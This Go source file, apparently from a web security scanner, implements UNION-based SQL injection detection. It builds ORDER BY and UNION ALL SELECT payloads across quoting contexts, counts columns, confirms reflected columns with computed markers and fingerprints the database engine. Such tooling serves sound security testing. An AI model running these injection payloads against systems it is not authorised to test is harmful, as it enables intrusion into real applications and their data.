package scanner

// UNION-based SQL injection (burpsy-react-ui-v0ei.5): sqlmap's technique U, written from the
// documented standard forms. Nothing here is recovered Burp bytes; Burp's SQL-injection type has no
// UNION detection method, so the technique runs under the check's own switch (CheckSqli) and is
// gated by no method name.
//
// # What it proves, and what it does not
//
// The proof is a value the DATABASE computed appearing in the page: a marker spelled as the
// concatenation of two literals (`CONCAT('bsyu','<rand>')`, `'bsyu'||'<rand>'`, `'bsyu'+'<rand>'`), so
// the joined string is never in the request and only an engine that evaluated the expression can
// produce it. ClassifyEvaluation additionally subtracts every echo of the payload. The first sighting
// is then confirmed with a second, independent expression in the same place: a fresh marker joined
// with an arithmetic product (`'bsyu'||'<rand2>'||(417*613)`), whose result is in neither the
// request nor the first response. An application that strips quotes and pipes from its input and
// echoes the rest produces the first marker by accident; it cannot produce the product.
//
// Column discovery is NOT evidence. ORDER BY n is binary-searched against two reference pages
// (ORDER BY 1 and ORDER BY 100), with a `UNION ALL SELECT NULL,...` outlier search as the fallback
// for a statement where ORDER BY is not admitted; both only decide where to put the marker. A column
// count that never carries a marker into the page is reported as nothing.
//
// # Cost
//
// On a point with no prior SQL evidence only the ORDER BY pair is sent per quoting context (two
// requests, plus one baseline re-fetch per point); the binary search and the marker search run only
// where the two ORDER BY pages differ. The NULL-count fallback runs only on a point another technique
// has already confirmed, where it costs requests to learn something (the UNION column count) about a
// finding that is already proven — never on a clean point.
//
// # Every probe is a SELECT
//
// The payloads append `ORDER BY n` or `UNION ALL SELECT <expressions>` to the application's own
// statement and comment out the rest. Nothing writes, and nothing calls a procedure.

import (
	"context"
	"fmt"
	mathrand "math/rand/v2"
	"strconv"
	"strings"

	"github.com/burpsy-go/burpsy/internal/bcheck"
)

// sqlUnionContext is one place the value sits in the statement: the text that closes it before the
// appended clause. The rest of the statement is always commented out with `-- `.
type sqlUnionContext struct{ name, prefix string }

var sqlUnionContexts = []sqlUnionContext{
	{"numeric", ""},
	{"single-quoted string", "'"},
	{"double-quoted string", `"`},
	{"parenthesised numeric", ")"},
	{"parenthesised string", "')"},
}

const (
	// unionOrderByCeiling is the ORDER BY index assumed to exceed any real column count.
	unionOrderByCeiling = 100
	// unionNullColumnsMax bounds the NULL-count fallback.
	unionNullColumnsMax = 10
	// unionMarkerColumnsMax bounds the reflected-column search; a wider statement is searched in its
	// first columns only, and the probe says so.
	unionMarkerColumnsMax = 16
	unionComment          = "-- "
	unionMarkerPrefix     = "bsyu"
)

// sqlConcatSpelling is one engine family's way to join strings in a SELECT list.
type sqlConcatSpelling struct {
	name string
	// from is appended to the UNION SELECT: Oracle needs a FROM clause, and DUAL is its one-row table.
	from string
	join func(parts ...string) string
	// str renders a numeric expression so it can be joined.
	str func(expr string) string
}

func sqlLiteral(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }

// sqlConcatSpellings is the order the marker search tries: CONCAT() (MySQL/MariaDB, PostgreSQL, SQL
// Server 2012+, H2, DB2), `||` (SQLite, PostgreSQL, H2, HSQLDB), `+` (SQL Server), and `||` FROM DUAL
// (Oracle).
func sqlConcatSpellings() []sqlConcatSpelling {
	concat := func(parts ...string) string { return "CONCAT(" + strings.Join(parts, ",") + ")" }
	pipes := func(parts ...string) string { return strings.Join(parts, "||") }
	plus := func(parts ...string) string { return strings.Join(parts, "+") }
	return []sqlConcatSpelling{
		{name: "CONCAT()", join: concat, str: func(e string) string { return e }},
		{name: "||", join: pipes, str: func(e string) string { return "(" + e + ")" }},
		{name: "+", join: plus, str: func(e string) string { return "CAST((" + e + ") AS VARCHAR(20))" }},
		{name: "|| FROM DUAL", from: " FROM DUAL", join: pipes, str: func(e string) string { return "(" + e + ")" }},
	}
}

// sqlUnionFingerprint names an engine by a function only that engine has: the expression joins two
// literals around SUBSTRING(<function>,1,0), which is empty when the function exists and an error
// when it does not, so the joined literals appear only on the engine that has it.
type sqlUnionFingerprint struct {
	dbms string
	expr func(a, b string) string
	from string
}

func sqlUnionFingerprints() []sqlUnionFingerprint {
	return []sqlUnionFingerprint{
		{dbms: "MySQL/MariaDB", expr: func(a, b string) string {
			return "CONCAT(" + sqlLiteral(a) + ",SUBSTRING(UUID_SHORT(),1,0)," + sqlLiteral(b) + ")"
		}},
		{dbms: "PostgreSQL", expr: func(a, b string) string {
			return "CONCAT(" + sqlLiteral(a) + ",SUBSTRING(CAST(PG_BACKEND_PID() AS TEXT),1,0)," + sqlLiteral(b) + ")"
		}},
		{dbms: "Microsoft SQL Server", expr: func(a, b string) string {
			return sqlLiteral(a) + "+SUBSTRING(CAST(@@SPID AS VARCHAR(9)),1,0)+" + sqlLiteral(b)
		}},
		{dbms: "Oracle", from: " FROM DUAL", expr: func(a, b string) string {
			return sqlLiteral(a) + "||SUBSTR(USERENV('SESSIONID'),1,0)||" + sqlLiteral(b)
		}},
		{dbms: "SQLite", expr: func(a, b string) string {
			return sqlLiteral(a) + "||substr(sqlite_version(),1,0)||" + sqlLiteral(b)
		}},
		{dbms: "H2", expr: func(a, b string) string {
			return "CONCAT(" + sqlLiteral(a) + ",SUBSTRING(H2VERSION(),1,0)," + sqlLiteral(b) + ")"
		}},
	}
}

// unionValueForm is how the UNION clause meets the application's value. replace substitutes a value
// that matches no row, so the injected row is the only one: an application that renders only the
// first row of its result shows nothing else. append keeps the value, for an application that lists
// every row and a value the replacement would not parse in.
type unionValueForm struct {
	name    string
	replace bool
}

var unionValueForms = []unionValueForm{{"replacing the value", true}, {"appended to the value", false}}

// unionNonMatchingValue is a value of the base value's shape that no row is expected to carry.
func unionNonMatchingValue(base string) string {
	if _, err := strconv.ParseFloat(strings.TrimSpace(base), 64); err == nil && strings.TrimSpace(base) != "" {
		return "-" + strconv.Itoa(40000+mathrand.IntN(50000))
	}
	return "bsynr" + randomLetters(6)
}

// unionRun is one point's UNION walk.
type unionRun struct {
	ctx  context.Context
	h    *ProbeHarness
	p    bcheck.InsertionPoint
	cmp  *booleanComparator
	repl string
	// notes records what column discovery learned without a marker, for the probe's detail.
	notes []string
}

func (u *unionRun) where() string { return fmt.Sprintf("%s %q", u.p.Kind, u.p.Name) }

// send places a clause after the context break, in a value form.
func (u *unionRun) send(form unionValueForm, clause string) (ProbeResponse, string, error) {
	if form.replace {
		payload := u.repl + clause
		r, err := u.h.Send(u.ctx, u.p, payload)
		return r, payload, err
	}
	r, err := u.h.SendAppending(u.ctx, u.p, clause)
	return r, clause, err
}

func (u *unionRun) page(form unionValueForm, clause string) (booleanPage, error) {
	r, payload, err := u.send(form, clause)
	if err != nil {
		return booleanPage{}, err
	}
	return u.cmp.page(r.Status, r.Body, payload), nil
}

// orderByColumns binary-searches ORDER BY n in one context. ok is false when the two reference pages
// do not differ (ORDER BY is not reaching a statement here) or a page fits neither reference.
func (u *unionRun) orderByColumns(c sqlUnionContext) (int, bool, error) {
	clause := func(n int) string { return c.prefix + " ORDER BY " + strconv.Itoa(n) + unionComment }
	form := unionValueForm{name: "appended to the value"}
	low, err := u.page(form, clause(1))
	if err != nil {
		return 0, false, err
	}
	high, err := u.page(form, clause(unionOrderByCeiling))
	if err != nil {
		return 0, false, err
	}
	if u.cmp.alike(low, high) {
		return 0, false, nil
	}
	lo, hi := 1, unionOrderByCeiling
	for hi-lo > 1 {
		mid := (lo + hi) / 2
		pm, err := u.page(form, clause(mid))
		if err != nil {
			return 0, false, err
		}
		switch {
		case u.cmp.alike(low, pm):
			lo = mid
		case u.cmp.alike(high, pm):
			hi = mid
		default:
			u.notes = append(u.notes, fmt.Sprintf("%s context: ORDER BY %d matched neither reference page", c.name, mid))
			return 0, false, nil
		}
	}
	if lo >= unionOrderByCeiling-1 {
		return 0, false, nil
	}
	return lo, true, nil
}

func nullColumns(n int) string { return strings.TrimSuffix(strings.Repeat("NULL,", n), ",") }

// nullCountColumns is the fallback: UNION ALL SELECT NULL with 1..max columns, in the value-replacing
// form. A wrong count is one error page for every wrong n; the right one is the single outlier.
func (u *unionRun) nullCountColumns(c sqlUnionContext) (int, bool, error) {
	form := unionValueForms[0]
	pages := make([]booleanPage, 0, unionNullColumnsMax)
	for n := 1; n <= unionNullColumnsMax; n++ {
		pg, err := u.page(form, c.prefix+" UNION ALL SELECT "+nullColumns(n)+unionComment)
		if err != nil {
			return 0, false, err
		}
		pages = append(pages, pg)
	}
	outlier := -1
	for i := range pages {
		alikeOthers := 0
		for j := range pages {
			if i != j && u.cmp.alike(pages[i], pages[j]) {
				alikeOthers++
			}
		}
		if alikeOthers == 0 {
			if outlier >= 0 {
				return 0, false, nil // two outliers: no single count stands out
			}
			outlier = i
		}
	}
	if outlier < 0 {
		return 0, false, nil
	}
	// Every other page must be one and the same page: the wrong-count error.
	ref := (outlier + 1) % len(pages)
	for j := range pages {
		if j != outlier && !u.cmp.alike(pages[ref], pages[j]) {
			return 0, false, nil
		}
	}
	return outlier + 1, true, nil
}

// unionSelect renders the SELECT list with expr at column pos (1-based) and NULL elsewhere.
func unionSelect(n, pos int, expr string) string {
	cols := make([]string, n)
	for i := range cols {
		cols[i] = "NULL"
	}
	cols[pos-1] = expr
	return strings.Join(cols, ",")
}

// unionHit is a confirmed reflected column.
type unionHit struct {
	ctx      sqlUnionContext
	form     unionValueForm
	spelling sqlConcatSpelling
	columns  int
	via      string // how the column count was learned
	pos      int
	payload  string
	confirm  string
}

// markerSearch places a concatenated marker in each column in turn, under each spelling and value
// form, and confirms the first sighting with an independent expression.
func (u *unionRun) markerSearch(c sqlUnionContext, n int) (*unionHit, error) {
	positions := n
	if positions > unionMarkerColumnsMax {
		positions = unionMarkerColumnsMax
		u.notes = append(u.notes, fmt.Sprintf("%s context: %d columns, the reflected-column search covered the first %d only", c.name, n, positions))
	}
	baseline := u.h.baseline.Body
	for _, form := range unionValueForms {
		for _, sp := range sqlConcatSpellings() {
			for pos := 1; pos <= positions; pos++ {
				if u.ctx.Err() != nil {
					return nil, u.ctx.Err()
				}
				r1 := newProbeCanary("")
				marker := unionMarkerPrefix + r1
				clause := c.prefix + " UNION ALL SELECT " + unionSelect(n, pos, sp.join(sqlLiteral(unionMarkerPrefix), sqlLiteral(r1))) + sp.from + unionComment
				resp, payload, err := u.send(form, clause)
				if err != nil {
					return nil, err
				}
				if ClassifyEvaluation(baseline, resp.Body, payload, marker) != InjectionEvidenceEvaluated {
					continue
				}
				// The confirmation: a fresh marker joined with a product the request does not carry.
				r2 := newProbeCanary("")
				a, b := 300+mathrand.IntN(600), 300+mathrand.IntN(600)
				want := unionMarkerPrefix + r2 + strconv.Itoa(a*b)
				expr := sp.join(sqlLiteral(unionMarkerPrefix), sqlLiteral(r2), sp.str(fmt.Sprintf("%d*%d", a, b)))
				clause2 := c.prefix + " UNION ALL SELECT " + unionSelect(n, pos, expr) + sp.from + unionComment
				resp2, payload2, err := u.send(form, clause2)
				if err != nil {
					return nil, err
				}
				if ClassifyEvaluation(baseline, resp2.Body, payload2, want) != InjectionEvidenceEvaluated {
					u.notes = append(u.notes, fmt.Sprintf("%s context: a %s marker appeared in column %d of %d, "+
						"and the confirming product did not", c.name, sp.name, pos, n))
					continue
				}
				return &unionHit{ctx: c, form: form, spelling: sp, columns: n, pos: pos, payload: payload, confirm: payload2}, nil
			}
		}
	}
	return nil, nil
}

// fingerprint names the DBMS from the engine-only functions, in the confirmed column. It returns
// the engines whose expression rendered.
func (u *unionRun) fingerprint(hit *unionHit) []string {
	var named []string
	for _, fp := range sqlUnionFingerprints() {
		if u.ctx.Err() != nil {
			return named
		}
		a, b := "bsyf", newProbeCanary("")
		clause := hit.ctx.prefix + " UNION ALL SELECT " + unionSelect(hit.columns, hit.pos, fp.expr(a, b)) + fp.from + unionComment
		resp, payload, err := u.send(hit.form, clause)
		if err != nil {
			continue
		}
		if ClassifyEvaluation(u.h.baseline.Body, resp.Body, payload, a+b) == InjectionEvidenceEvaluated {
			named = append(named, fp.dbms)
		}
	}
	return named
}

// sqlUnionProbe runs the UNION technique at one point. orderBy runs the ORDER BY discovery;
// nullFallback the NULL-count fallback when ORDER BY settled no column count (only on a point
// another technique has confirmed — see the file header). counted reports whether a column count
// was learned at all, so a caller does not pay for the fallback after ORDER BY already answered.
func sqlUnionProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, orderBy, nullFallback bool) (InjectionProbe, bool) {
	out := InjectionProbe{Payload: "UNION SELECT column discovery"}
	counted := false
	where := fmt.Sprintf("%s %q", p.Kind, p.Name)
	again, err := h.SendAppending(ctx, p, "")
	if err != nil {
		out.Evidence = InjectionEvidenceNone
		out.Detail = fmt.Sprintf("%s: UNION technique not run: the baseline re-fetch failed: %v", where, err)
		return out, false
	}
	cmp := newBooleanComparator(h.baseline.Status, h.baseline.Body, again.Status, again.Body)
	u := &unionRun{ctx: ctx, h: h, p: p, cmp: cmp, repl: unionNonMatchingValue(p.BaseValue)}
	if !cmp.stable() {
		// Column discovery compares pages; an unstable page cannot be compared. The boolean technique
		// reports this page undecided on its own probe; this one says only what it did not do.
		out.Evidence = InjectionEvidenceNone
		out.Detail = fmt.Sprintf("%s: UNION column discovery not run: two fetches of the unmodified request are only %.2f alike", where, cmp.stability)
		return out, false
	}
	tried := map[string]bool{}
	var hit *unionHit
	for _, c := range sqlUnionContexts {
		if ctx.Err() != nil || hit != nil {
			break
		}
		if !orderBy {
			break
		}
		n, ok, err := u.orderByColumns(c)
		if err != nil {
			u.notes = append(u.notes, fmt.Sprintf("%s context: ORDER BY discovery not completed: %v", c.name, err))
			continue
		}
		if !ok {
			continue
		}
		tried[c.name] = true
		counted = true
		if hit, err = u.markerSearch(c, n); err != nil {
			u.notes = append(u.notes, fmt.Sprintf("%s context: marker search not completed: %v", c.name, err))
		} else if hit != nil {
			hit.via = "ORDER BY binary search"
		} else {
			u.notes = append(u.notes, fmt.Sprintf("%s context: ORDER BY puts the column count at %d, and no column carried a computed marker into the page", c.name, n))
		}
	}
	// The fallback is for a statement ORDER BY never reached. Where ORDER BY already settled a column
	// count and no column reflected, counting again with NULLs in other contexts learns nothing.
	for _, c := range sqlUnionContexts {
		if ctx.Err() != nil || hit != nil || !nullFallback || len(tried) > 0 {
			break
		}
		if tried[c.name] {
			continue
		}
		n, ok, err := u.nullCountColumns(c)
		if err != nil || !ok {
			continue
		}
		counted = true
		if hit, err = u.markerSearch(c, n); err != nil {
			u.notes = append(u.notes, fmt.Sprintf("%s context: marker search not completed: %v", c.name, err))
		} else if hit != nil {
			hit.via = "UNION SELECT NULL count"
		} else {
			u.notes = append(u.notes, fmt.Sprintf("%s context: UNION SELECT NULL puts the column count at %d, and no column carried a computed marker into the page", c.name, n))
		}
	}
	if hit == nil {
		out.Evidence = InjectionEvidenceNone
		out.Detail = fmt.Sprintf("%s: %s", where, InjectionEvidenceNone)
		if len(u.notes) > 0 {
			out.Detail += " (" + strings.Join(u.notes, "; ") + ")"
		}
		return out, counted
	}
	dbms := "not identified (no engine-specific function rendered)"
	switch named := u.fingerprint(hit); len(named) {
	case 0:
	case 1:
		dbms = named[0]
	default:
		dbms = "ambiguous (" + strings.Join(named, ", ") + " all rendered)"
	}
	out.Payload = hit.payload + " ; " + hit.confirm
	out.Evidence = InjectionEvidenceEvaluated
	out.Detail = fmt.Sprintf("%s: UNION-based: in the %s context (%s), a UNION ALL SELECT of %d column(s) (count from the %s) carried a "+
		"%s-concatenated marker the request never spelled out into column %d of the page, and a second expression "+
		"joining a fresh marker with an arithmetic product rendered there too; DBMS: %s",
		where, hit.ctx.name, hit.form.name, hit.columns, hit.via, hit.spelling.name, hit.pos, dbms)
	return out, true
}
